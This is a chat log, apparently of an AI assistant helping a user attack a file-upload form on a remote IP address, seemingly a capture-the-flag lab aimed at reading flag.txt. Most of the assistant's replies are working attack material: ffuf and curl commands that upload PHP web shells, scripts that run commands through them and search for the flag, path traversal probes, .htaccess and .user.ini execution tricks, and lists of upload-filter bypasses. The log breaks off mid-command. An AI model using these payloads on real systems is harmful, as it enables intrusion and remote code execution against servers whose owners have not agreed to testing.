 give me ffuf test code shellFUZZ with word2.txt(wordlist)
Here's an ffuf test command to fuzz for file upload vulnerabilities based on your request, targeting the filename parameter:

bash
ffuf -u "http://94.237.51.90:47341/upload.php" \
     -X POST \
     -H "Host: 94.237.51.90:47341" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Accept-Language: en-US,en;q=0.9" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -b "COOKIENAME=COOKIEVALUE" \  # Add if needed
     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\nundefinegwen2\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
     -w word2.txt \
     -fr "error|forbidden"  # Filter common error responses
Important notes:

This tests filename extensions from your wordlist (word2.txt)

The null byte (%00) trick won't work with ffuf as it doesn't URL-encode payloads by default

For null byte testing, you might need to manually craft requests or use another tool

Adjust the boundary string if needed

Add cookies if authentication is required

Consider adding -mc all to see all status codes if needed

Alternative approach for null byte testing:

bash
# Create a custom wordlist with null bytes
sed 's/$/%00/' word2.txt > word2_null.txt

# Then use this wordlist with -w word2_null.txt
Remember to review the server's response patterns and adjust filters accordingly.

please curl post /profile_images/%20.phar.jpg
Here's a curl command to POST a file named %20.phar.jpg to the /profile_images/ endpoint:

bash
curl -i -X POST "http://94.237.51.90:47341/profile_images/%20.phar.jpg" \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "Accept: */*" \
     -H "Accept-Language: en-US,en;q=0.9" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     --data-binary $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="%20.phar.jpg"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n'
Key points about this command:

The filename contains a space (%20) and double extension (.phar.jpg)

The file content includes a simple PHP shell (adjust as needed)

Uses the same boundary string from your original request

Includes all relevant headers from your initial request

If you need to:

Add cookies: Use -b "cookie_name=cookie_value"

Upload an actual file: Replace the --data-binary part with -F "uploadFile=@actual_file.phar.jpg"

Test for null byte: Change filename to %20.phar.jpg%00 (though null byte may not work in all environments)

Remember to check the server response to see if the upload was successful.

%20.phar.jpg is in my loacl
If you want to upload a local file named %20.phar.jpg using curl, here's the command:

bash
curl -X POST "http://94.237.51.90:47341/profile_images/" \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "Accept: */*" \
     -H "Accept-Language: en-US,en;q=0.9" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -F "uploadFile=@%20.phar.jpg;filename=%20.phar.jpg"
Explanation:
-X POST: Sends a POST request to /profile_images/

-F "uploadFile=@%20.phar.jpg": Uploads the local file (%20.phar.jpg) as a form field named uploadFile

;filename=%20.phar.jpg ensures the filename is preserved (URL-encoded space as %20)

All headers match your original request for consistency

If the server expects a different field name:
Replace uploadFile with the correct parameter (e.g., -F "file=@%20.phar.jpg")

If you need to test for null byte truncation:
bash
-F "uploadFile=@%20.phar.jpg;filename=%20.phar.jpg%00"
(Note: Some servers may block or filter null bytes.)

Verify the upload:
After uploading, check if the file is accessible at:

bash
curl "http://94.237.51.90:47341/profile_images/%20.phar.jpg"
Let me know if you need adjustments! 🚀

make ffuf code for fuzz
Here's an optimized ffuf command to fuzz file uploads with %20.phar.jpg and other payloads from a wordlist (e.g., word2.txt):

bash
ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
     -X POST \
     -w word2.txt \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -b "PHPSESSID=12345" \  # Add session cookie if needed
     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
     -fr "error|forbidden|denied" \
     -o fuzz_results.json \
     -t 50 \
     -rate 10
Key Features:
Smart Fuzzing:

Tests all entries in word2.txt as filenames (e.g., %20.phar.jpg, .htaccess, shell.php5)

Automatically handles the multipart boundary

Filtering:

-fr filters out common error responses

Focuses on potentially successful uploads

Performance:

-t 50 for 50 concurrent threads

-rate 10 limits to 10 requests/sec (adjust as needed)

Output:

Saves results to fuzz_results.json

Advanced Version (Null Byte Testing):
bash
# Create a null-byte wordlist
sed 's/$/%00/' word2.txt > word2_null.txt

# Run ffuf with null-byte variants
ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
     -w word2_null.txt \
     [other parameters from above]
Pro Tips:
For LFI testing, chain with:

bash
ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ?cmd=id" \
     -w successful_uploads.txt
Use -mc all -ac to auto-calibrate response filtering

Would you like me to add any specific test cases (e.g., double extensions, case bypass)?

-d: command not found
It looks like you're encountering an issue with the ffuf command execution. The error -d: command not found suggests there might be a problem with how the command is being interpreted by your shell. Here's how to fix and optimize your fuzzing approach:

Fixed FFUF Command
bash
ffuf -u "http://94.237.51.90:47341/profile_images/" \
     -X POST \
     -w word2.txt \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -b "PHPSESSID=12345" \
     -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" \
     -fr "error|forbidden|denied" \
     -o fuzz_results.json \
     -t 40 \
     -rate 10
Key Observations from Your Output:
403 Forbidden Responses: All attempts are being blocked (403 status)

Possible WAF: The consistent 403s suggest a Web Application Firewall is blocking your fuzzing attempts

Rate Limiting: Some responses took ~3.7s (like shell.jpg%20.phps), indicating possible rate limiting

Recommended Adjustments:
Slow Down the Attack:

bash
-t 20 -rate 5  # Reduce threads and requests/sec
Try Different Bypass Techniques:

bash
# Create a custom wordlist with these variations:
echo -e ".htaccess\n.htaccess.bak\n.%20.phar.jpg\nshell.pHp5\nshell.php\x00.jpg" > bypass.txt
Alternative Approach with File Upload:

bash
ffuf -u "http://94.237.51.90:47341/upload.php" \
     -X POST \
     -w bypass.txt \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTEST" \
     -F "uploadFile=@test.jpg;filename=FUZZ" \
     -fr "403"
Check for LFI First:

bash
ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
     -w word2.txt \
     -recursion -recursion-depth 2
Next Steps:
First identify if any files are accessible in /profile_images/

Try simpler GET requests before POST fuzzing

Check if the WAF has any bypasses (like HTTP parameter pollution)

Test with different content types (try application/x-www-form-urlencoded)

The consistent 403 responses suggest you'll need to either:

Find the WAF's whitelisted patterns

Slow down your attack rate

Try different request formatting

Would you like me to suggest specific WAF bypass techniques for this scenario?

I need a "successfully uploaded" response form the server So i need to filter that result
To filter for successful uploads in ffuf, you'll need to analyze the server's responses and craft appropriate matchers/filters. Based on your earlier output showing consistent 403 responses, here's how to refine your approach:

Optimized FFUF Command for Successful Upload Detection
bash
ffuf -u "http://94.237.51.90:47341/upload.php" \
     -X POST \
     -w word2.txt \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -b "PHPSESSID=12345" \
     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
     -mr "success|uploaded|200 OK" \  # Match responses containing these phrases
     -mc 200 \                       # Match HTTP 200 status
     -fw 0 \                         # Filter out responses with 0 words
     -o fuzz_results.json \
     -t 20 \
     -rate 5
Key Adjustments:
Response Matchers:

-mr "success|uploaded|200 OK" - Looks for these success indicators

-mc 200 - Only shows HTTP 200 responses

-fw 0 - Filters empty responses

Slower Rate:

Reduced to -t 20 -rate 5 to avoid WAF blocking

Alternative Success Detection:
If the server returns JSON responses, use:

bash
-mr '"status":"success"' 
Post-Fuzzing Verification:
For any potentially successful uploads, verify with:

bash
# Check if file exists
ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
     -w potential_hits.txt \
     -mc 200 -fs 280  # Exclude the 403 response size you saw earlier

# Test command execution
curl "http://94.237.51.90:47341/profile_images/shell123.jpg?cmd=id"
Advanced Filtering:
If the server uses custom success messages, first capture a baseline:

bash
# 1. Make a legitimate upload request with a valid file
curl -i -X POST [normal_upload_request] > valid_response.txt

# 2. Extract unique success indicators
grep -oP "unique-success-pattern" valid_response.txt

# 3. Use these in ffuf
-mr "File uploaded successfully|upload_id:"
Would you like me to suggest specific payload modifications that often bypass upload restrictions? Common successful patterns include:

.php5

.phtml

.phar

Double extensions with null bytes (shell.jpg%00.php)

every thing will be OK so I need to check its contents man
Got it! You want to verify the contents of any successfully uploaded files to confirm code execution. Here's a comprehensive approach:

1. First, Identify Successful Uploads
bash
ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
     -w word2.txt \
     -mc 200 -fc 403 \
     -t 20 \
     -o found_files.json
2. Manual Verification of Files
For each potentially uploaded file from your results:

Check File Contents:
bash
curl "http://94.237.51.90:47341/profile_images/suspicious_file.phps"
Verify PHP Execution:
bash
# Test with simple command
curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=whoami"

# Full interactive test
curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=id;uname -a;pwd"
3. Automated Content Checking
Create a verification script (verify.sh):

bash
#!/bin/bash
for file in $(cat found_files.json | jq -r '.results[] | select(.status == 200) | .input.FUZZ'); do
    echo -e "\n\033[1;36mTesting $file\033[0m"
    # Check if file exists
    curl -s "http://94.237.51.90:47341/profile_images/$file" | head -c 100
    # Test command execution
    echo -e "\nCommand execution:"
    curl -s "http://94.237.51.90:47341/profile_images/$file?cmd=id" | grep -v "not allowed"
done
4. Common Success Patterns to Check
If you find uploaded files but they're not executing:

Check for Magic Bytes Bypass:
bash
# Create JPEG with PHP payload
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.jpg.php

# Upload and verify
curl -X POST -F "file=@shell.jpg.php" http://target/upload.php
Check for .htaccess Override:
bash
echo "AddType application/x-httpd-php .xyz" > .htaccess
curl -X POST -F "file=@.htaccess" http://target/upload.php
5. Debugging Tips
If you get 200 but no execution:

bash
# Check file permissions
curl "http://target/profile_images/shell.php?cmd=ls -la"

# Check disabled functions
curl "http://target/profile_images/shell.php?cmd=phpinfo();"
6. Final Verification Checklist
Confirm HTTP 200 response

Verify actual file contents match what you uploaded

Test with simple command execution

Check for any output filtering/WAF blocking

Would you like me to provide specific payloads that commonly work when standard uploads fail? For example:

Case-insensitive extensions (.PhP, .pHp5)

Double extensions with null bytes

Magic byte injections

.htaccess override techniques

the server will return specific "successfully uploaded" string if this fuzz works so every word will be 200 ok with "please upload photo"
Ah, I understand now! You need to filter specifically for the "successfully uploaded" response while excluding the generic 200 OK responses that just say "please upload photo". Here's the precise ffuf command to achieve this:

Optimized FFUF Command for Exact Success Detection
bash
ffuf -u "http://94.237.51.90:47341/upload.php" \
     -X POST \
     -w word2.txt \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -b "PHPSESSID=12345" \
     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
     -mc 200 \                       # Match HTTP 200 responses
     -mr "successfully uploaded" \    # ONLY show responses containing this EXACT phrase
     -fr "please upload photo" \      # FILTER OUT responses with this phrase
     -o successful_uploads.json \
     -t 20 \
     -rate 5
Key Adjustments
-mr "successfully uploaded"
→ Only matches responses containing "successfully uploaded" (case-sensitive).

-fr "please upload photo"
→ Explicitly filters out responses that say "please upload photo" (common false positive).

-mc 200
→ Still ensures only HTTP 200 responses are considered (but now with stricter content filtering).

Slower Rate (-t 20 -rate 5)
→ Avoids WAF/rate-limiting while testing.

Post-Fuzzing Verification
If you get hits, manually verify them:

bash
# Check if the file was really uploaded
curl "http://94.237.51.90:47341/profile_images/shell.phps"

# Test command execution (if it's a PHP shell)
curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=id"
Alternative Approach (If Exact String is Unknown)
If you're unsure of the exact success message, but know it’s different from "please upload photo", use:

bash
ffuf ... (same as above) \
     -mc 200 \
     -fr "please upload photo" \  
     -fs 1234  # Filter out responses with a specific size (if "please upload photo" has a fixed length)
Expected Outcomes
✅ Success → Returns only filenames that trigger "successfully uploaded".
❌ No Results? → The server may be blocking all your payloads (check WAF bypass techniques).

Would you like me to suggest advanced bypass payloads (null bytes, case tampering, .htaccess tricks) if this doesn’t work?

:: Progress: [3452/3452] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
Command '-mr' not found, did you mean:

  command 'amr' from deb acr
Try: sudo apt install <deb name>
-fr: command not found
-o: command not found
It looks like you're encountering shell syntax issues when running the ffuf command. The errors (-mr not found, -fr not found, etc.) suggest that the shell is interpreting the flags as separate commands rather than passing them to ffuf. Here's how to fix this:

Corrected FFUF Command (Proper Syntax)
bash
ffuf -u "http://94.237.51.90:47341/upload.php" \
     -X POST \

     -rate 5
Key Fixes:
Removed $'...' syntax for the -d parameter (use regular double quotes)

Properly escaped inner quotes in the form data

Ensure all flags are on the same line (using \ line continuations)

Alternative Solution (If Still Having Issues)
If you're still getting syntax errors, try this simplified version:

bash
ffuf -u http://94.237.51.90:47341/upload.php -X POST -w word2.txt -H "Host: 94.237.51.90:47341" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" -H "X-Requested-With: XMLHttpRequest" -H "Origin: http://94.237.51.90:47341" -H "Referer: http://94.237.51.90:47341/" -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" -b "PHPSESSID=12345" -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" -mr "successfully uploaded" -fr "please upload photo" -o successful_uploads.json -t 20 -rate 5
If You're Seeing "Command Not Found" for FFUF Itself:
Make sure ffuf is installed:

bash
which ffuf || sudo apt install ffuf  # Or download from github.com/ffuf/ffuf
Verify installation:

bash
ffuf -version
"Only images are allowed" is a fail command otherwise "File successfully uploaded"
Here's the optimized ffuf command to specifically detect successful file uploads while filtering out failures:

bash
ffuf -u "http://94.237.51.90:47341/upload.php" \
     -X POST \
     -w word2.txt \
     -H "Host: 94.237.51.90:47341" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
     -H "X-Requested-With: XMLHttpRequest" \
     -H "Origin: http://94.237.51.90:47341" \
     -H "Referer: http://94.237.51.90:47341/" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
     -b "PHPSESSID=12345" \
     -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" \
     -mr "File successfully uploaded" \
     -fr "Only images are allowed" \
     -o successful_uploads.json \
     -t 20 \
     -rate 5
Key Features:
Precise Matching:

-mr "File successfully uploaded" - Only shows responses containing this exact success message

-fr "Only images are allowed" - Explicitly filters out failed upload attempts

Reliable Detection:

Uses both positive (-mr) and negative (-fr) matching to ensure only genuine successes are shown

HTTP 200 status is implied when using match/filter response

Performance:

Conservative rate (-t 20 -rate 5) to avoid triggering WAF protections

Properly escaped form data to prevent shell interpretation issues

Output:

Results saved to successful_uploads.json for later analysis

Verification:
After finding potential uploads, verify with:

bash
# Check if file exists
curl "http://94.237.51.90:47341/profile_images/suspected_file.phps"

# Test command execution
curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=id"
Alternative Approach:
If you're still getting false positives, try adding size filtering:

bash
# First capture the size of "Only images are allowed" response
curl -s "http://94.237.51.90:47341/upload.php" | wc -c

# Then add to ffuf (example if failure response is 280 bytes)
-fs 280
This ensures you're filtering by both content and size for maximum accuracy.

#!/bin/bash
#usage: supply your filename wordlist with the execution of this script. It replaces each line with $line 
#./repeat.sh wordlist.txt

input=$1
while IFS= read -r line
do
        echo 'doing' $line':'
        curl -I http://83.136.255.115:46810/profile_images/$line?cmd=id
done < "$input"
                       make it better
Here's an improved version of your script with better error handling, progress tracking, and output formatting:

bash
#!/bin/bash
# Enhanced File Upload Tester
# Usage: ./upload_tester.sh wordlist.txt

if [ $# -eq 0 ]; then
    echo "Error: No wordlist specified"
    echo "Usage: $0 wordlist.txt"
    exit 1
fi

input="$1"
total_lines=$(wc -l < "$input")
current_line=0
success_count=0
timestamp=$(date +"%Y%m%d_%H%M%S")
output_file="results_${timestamp}.txt"

echo "Starting file upload test with $total_lines entries..."
echo "Output will be saved to $output_file"
echo ""

while IFS= read -r line; do
    ((current_line++))
    echo -n "[$current_line/$total_lines] Testing $line: "
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "http://83.136.255.115:46810/profile_images/$line?cmd=id")
    
    if [ "$response" -eq 200 ]; then
        echo -e "\033[32mSUCCESS\033[0m (200 OK)"
        echo "$line" >> "$output_file"
        ((success_count++))
        
        # Optional: Test command execution
        execution_result=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=id")
        echo "  Command execution result: $execution_result" | tee -a "$output_file"
    else
        echo -e "\033[31mFAILED\033[0m ($response)"
    fi
    
    # Small delay to avoid overwhelming the server
    sleep 0.5
    
done < "$input"

echo ""
echo "Test completed. Found $success_count potentially vulnerable files."
echo "Successful uploads saved to $output_file"
Key Improvements:
Better Usage Handling:

Checks for input file

Shows proper usage if no file specified

Progress Tracking:

Shows current line/total count

Color-coded success/failure indicators

Result Verification:

Checks HTTP status code (200 = success)

Tests command execution for successful finds

Saves results to timestamped output file

Performance:

Added small delay between requests

Silent mode for cleaner output

Output:

Detailed summary at completion

Successful finds saved to file

Additional Features You Could Add:
Parallel Testing (use xargs or parallel):

bash
xargs -P 10 -I {} curl -s -o /dev/null -w "{} %{http_code}\n" "http://target/profile_images/{}" < "$input"
Custom Headers Support:

bash
headers=(
    "-H 'User-Agent: Mozilla/5.0'"
    "-H 'X-Custom: test'"
)
curl "${headers[@]}" "http://target/profile_images/$line"
Timeout Handling:

bash
curl --max-time 5 --connect-timeout 3 ...
Retry Mechanism:

bash
max_retries=3
retry_count=0
while [ $retry_count -lt $max_retries ]; do
    response=$(curl ...)
    [ "$response" -eq 200 ] && break
    ((retry_count++))
    sleep 1
done
To use the improved script:

bash
chmod +x upload_tester.sh
./upload_tester.sh wordlist.txt
I want to  find flag.txt
Here's a comprehensive approach to find flag.txt on the target system, building on your file upload testing:

1. First, Check Common Flag Locations
bash
#!/bin/bash
# Fast flag location checker
# Usage: ./find_flag.sh

common_locations=(
    "/flag.txt"
    "/var/www/html/flag.txt"
    "/home/flag.txt"
    "/root/flag.txt"
    "/tmp/flag.txt"
    "/var/lib/flag.txt"
)

for location in "${common_locations[@]}"; do
    echo -n "Checking $location: "
    if curl -s "http://83.136.255.115:46810/profile_images/../../../../..$location" | grep -q "[A-Za-z0-9]{32}"; then
        echo -e "\033[32mFOUND!\033[0m"
        curl -s "http://83.136.255.115:46810/profile_images/../../../../..$location"
        exit 0
    else
        echo -e "\033[31mNot found\033[0m"
    fi
done

echo "Flag not found in common locations. Trying deeper search..."
2. If You Have Command Execution
If you found a vulnerable upload that allows command execution:

bash
# Search entire filesystem (basic)
curl "http://83.136.255.115:46810/profile_images/shell.php?cmd=find / -name flag.txt 2>/dev/null"

# More thorough search
curl "http://83.136.255.115:46810/profile_images/shell.php?cmd=grep -r 'FLAG{' / 2>/dev/null"
3. Automated Full Search Script
bash
#!/bin/bash
# Comprehensive flag finder with upload testing
# Usage: ./find_flag_with_upload.sh wordlist.txt

if [ $# -eq 0 ]; then
    echo "Usage: $0 wordlist.txt"
    exit 1
fi

input="$1"
timestamp=$(date +"%Y%m%d_%H%M%S")
output_file="flag_search_${timestamp}.log"

echo "Starting flag search..." | tee "$output_file"

while IFS= read -r line; do
    # Test if file exists in upload directory
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://83.136.255.115:46810/profile_images/$line")
    
    if [ "$status" -eq 200 ]; then
        echo "[+] Found accessible file: $line" | tee -a "$output_file"
        
        # Test for command execution
        exec_test=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=id")
        if [[ "$exec_test" == *"uid="* ]]; then
            echo "[!] COMMAND EXECUTION WORKING!" | tee -a "$output_file"
            
            # Search for flag
            echo "[*] Searching for flag.txt..." | tee -a "$output_file"
            flag_locations=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=find / -type f -name flag.txt 2>/dev/null")
            
            if [ -n "$flag_locations" ]; then
                echo -e "\033[32m[+] FLAG LOCATIONS FOUND:\033[0m" | tee -a "$output_file"
                echo "$flag_locations" | tee -a "$output_file"
                
                # Retrieve first found flag
                first_flag=$(echo "$flag_locations" | head -1)
                flag_content=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=cat $(echo $first_flag | sed 's/ /\\ /g')")
                echo -e "\033[32m[+] FLAG CONTENT:\033[0m $flag_content" | tee -a "$output_file"
                exit 0
            else
                echo "[-] No flag.txt found via find command" | tee -a "$output_file"
            fi
        fi
    fi
done < "$input"

echo "[-] Flag not found through automated search" | tee -a "$output_file"
4. Alternative Methods If Upload Fails
If you can't find an upload vulnerability:

bash
# Check for LFI vulnerabilities
curl "http://83.136.255.115:46810/page.php?file=../../../../etc/passwd"

# Check backup files
curl "http://83.136.255.115:46810/profile_images/flag.txt.bak"

# Check environment variables
curl "http://83.136.255.115:46810/cgi-bin/status"  # Might leak env vars
5. Post-Exploitation Flag Search
If you get limited shell access:

bash
# Quick search
find / -name "*flag*" 2>/dev/null

# Content search (for CTF-style flags)
grep -r "FLAG{" / 2>/dev/null

# Check common directories
ls -la /root /home /var/www
Remember to:

Check file permissions (ls -la /path/to/flag.txt)

Try different path traversal depths (../ vs ../../../../)

Check for hidden files/directories

Look in backups (/var/backups) and logs (/var/log)

extensions=('.php' '.phps' '.phar' '.phtml' '.php5' '.php7' '.htaccess') should I add some more extensions?
Here's an expanded list of file extensions you should consider for file upload testing, along with smart testing strategies:

Recommended Additional Extensions
bash
extensions=(
    # PHP variants
    '.php' '.phps' '.phar' '.phtml' '.php3' '.php4' '.php5' '.php7' '.php8'
    '.php.gz' '.php.inc' '.php.test' '.php.txt'
    
    # Engine-specific
    '.asp' '.aspx' '.jsp' '.jspx' '.cfm' '.action'
    
    # Server configs
    '.htaccess' '.htpasswd' '.user.ini'
    
    # Double extensions
    '.jpg.php' '.png.php' '.gif.php'
    '.php.jpg' '.php.png' '.php.gif'
    
    # Null byte tricks (URL-encoded)
    '.php%00.jpg' '.php%00.png'
    '.php\x00.jpg' '.php\0.jpg'
    
    # Case variations
    '.PHP' '.Php' '.pHp' '.pHP'
    
    # Special characters
    '.php.' '.php..' '.php ' '.php%20'
    '.php:' '.php;' '.php|' '.php%0a'
    
    # Archive formats
    '.zip' '.tar.gz' '.rar' # If file extraction is possible
    
    # Template files
    '.tpl' '.twig' '.blade.php'
    
    # Less common
    '.shtml' '.pht' '.pgif' '.phpt'
)
Smart Testing Strategies
Test with Multiple Payloads:

bash
# Test each extension with different content types
for ext in "${extensions[@]}"; do
    echo "Testing $ext:"
    # 1. Basic PHP shell
    echo '<?php system($_GET["cmd"]); ?>' > shell$ext
    # 2. Polyglot file (e.g., PHP+JPEG)
    echo -e "\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>" > polyglot$ext
    # Upload both versions
done
Content-Type Bypass:

bash
# Try different Content-Type headers
content_types=(
    "image/jpeg"
    "image/png"
    "text/plain"
    "application/x-php"
)
.htaccess Override:

bash
# If .htaccess upload works, add these rules:
echo "AddType application/x-httpd-php .xyz" > .htaccess
echo "AddHandler application/x-httpd-php .abc" >> .htaccess
User.ini Technique:

bash
# For PHP configurations
echo "auto_prepend_file=shell.jpg" > .user.ini
Critical Extensions to Prioritize
.htaccess - Can override server settings

.phar - PHP Archive (often overlooked)

.phtml - Executable HTML with PHP

%00.jpg - Null byte bypass

.php5 - Alternative PHP handler

Pro Tip:
Monitor server responses for:

Different HTTP status codes (200 vs 403 vs 500)

Varying response sizes

Changes in error messages

Time delays (WAF fingerprinting)

Would you like me to provide a ready-to-use test script that systematically tries all these extensions with different bypass techniques?

# Special characters to test
chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '%3B' '%26' '%23')

Key Improvements:
Added Comprehensive Image Extensions:

Includes all common image formats (.jpg, .jpeg, .png, .gif, etc.)

Generates combinations with both leading and trailing positions

Enhanced Special Character Testing:

Tests special characters in multiple positions

Includes Windows-specific special characters (:, >, <, *, ?)

Case Variation Testing:

Systematic case variation testing (uppercase, mixed case)

Combined with image extensions

Polyglot File Names:

Generates realistic-looking filenames (image.php.jpg, photo.png.php)

Optimized Output:

Automatic deduplication with sort -u

Progress reporting during generation

Final count of unique entries

Example Output Entries:
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php%20
shell.pHp5
shell.png.pHp
shell::DATA.php
shell.php%0a.jpg
image.php.png
photo.jpg.php
This wordlist will test:

All standard bypass techniques

Case sensitivity issues

Special character handling

MIME type verification bypasses

Polyglot file acceptance

Windows/Linux path handling differences

Would you like me to add any specific advanced techniques like:

Null byte variations

Path traversal combinations

.htaccess payloads

User.ini configurations?

guess that is no joy right?
Based on your results showing 7,292 errors and 0 successful uploads, it appears the server has strong protections against standard file upload bypass techniques. However, let's try some advanced methods before giving up.

Next-Level Bypass Techniques to Try:
Magic Byte Injection (Polyglot Files)

bash
# Create a fake JPEG with PHP payload
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.jpg.php
curl -X POST -F "uploadFile=@shell.jpg.php" -H "Content-Type: image/jpeg" http://target/upload.php
.htaccess Override Attack

bash
# First upload .htaccess to enable PHP execution on image files
echo "AddType application/x-httpd-php .pwn" > .htaccess
curl -X POST -F "uploadFile=@.htaccess" http://target/upload.php

# Then upload your shell with custom extension
echo '<?php system($_GET["cmd"]); ?>' > shell.pwn
curl -X POST -F "uploadFile=@shell.pwn" http://target/upload.php
Null Byte in Filename (Alternative Methods)

bash
# Using URL encoding
curl -X POST -F "uploadFile=@shell.php%00.jpg" http://target/upload.php

# Using hex representation
curl -X POST -F "uploadFile=@shell.php\x00.jpg" http://target/upload.php
Content-Type Spoofing

bash
# Try different Content-Type headers
for type in "image/jpeg" "image/png" "text/plain" "application/octet-stream"; do
